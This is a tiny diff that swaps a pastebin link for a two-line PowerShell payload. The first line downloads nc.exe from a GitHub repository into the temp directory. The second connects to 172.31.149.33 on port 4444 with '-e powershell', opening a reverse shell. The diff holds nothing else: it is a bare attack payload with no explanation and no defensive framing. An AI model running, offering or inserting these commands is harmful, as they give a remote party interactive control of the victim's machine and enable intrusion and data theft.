@@ -1,1 +1,2 @@
-https://pastebin.com/qjHVjHcB
+Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/pastebin/nc.exe?raw=true' -UseBasicParsing -OutFile $env:tmp\nc.exe
+powershell -command "$env:tmp\nc.exe 172.31.149.33 4444 -e powershell"
